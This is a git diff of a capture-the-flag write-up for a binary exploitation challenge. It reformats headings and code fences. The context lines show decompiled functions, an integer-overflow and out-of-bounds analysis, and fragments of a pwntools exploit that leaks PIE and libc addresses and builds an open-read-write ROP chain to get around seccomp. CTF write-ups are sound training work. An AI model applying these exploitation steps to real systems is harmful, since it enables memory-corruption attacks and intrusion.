@@ -20,7 +20,7 @@ Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RU
 ```
 
 ___
-Code extraced from ghidra:
+### Codes extraced from ghidra:
 
 `main()`:
 ```c
@@ -56,7 +56,7 @@ int main(void)
 }
 ```
 `calibrate_rings()`:
-```
+```c
 void calibrate_rings(void)
 
 {
@@ -142,7 +142,7 @@ void read_plasma_signature(void)
 }
 ```
 `inject_plasma()`:
-```
+```c
 void inject_plasma(void)
 
 {
@@ -167,7 +167,7 @@ void inject_plasma(void)
   return;
 }
 ```
-Vulnerbilities:
+**Vulnerbilities:**
 * `setup_seccomp();`: we cannot use bin/sh attack
 * `calibrate_rings()`:
   * We have **Integer Overflow** and **Out of bound** vuln in the code:
@@ -211,7 +211,7 @@ Vulnerbilities:
 
     Since seccomp() is active, we will build a ORW (Open-Read-Write) payload to bypass the check.
 ___
-script.py:
+**script.py:**
 ```python
 from pwn import *
 
@@ -236,7 +236,7 @@ p = process(exe.path)
 GDB()
 
 
-### Leak phase
+### Leak phase ######
 p.sendafter(b"3):", b"65535")
 
 p.recvuntil(b"energy: ")
@@ -264,7 +264,7 @@ print(f"pie_base: {hex(pie_base)}")
 print(f"plasma_sig: {hex(plasma_sig)}")
 print(f"libc_base: {hex(libc.address)}")
 
-### Payload sits here
+### Payload sits here ######
 # payload = b"AAAA"
 # ret = pie_base + 0x101a
 # rop = ROP(libc)
@@ -283,7 +283,7 @@ pop_rdi = libc.address + 0x000000000010269a
 pop_rsi = libc.address + 0x0000000000053887
 pop_rdx_xor_eax = libc.address + 0x00000000000d6ffd
 
-# --- 1. Construct and send the ORW Chain ---
+# ORW payload since bin/sh doesnt work
 bss_addr = pie_base + exe.bss()
 flag_str_addr = bss_addr + 0x500 
 read_buf = bss_addr + 0x600
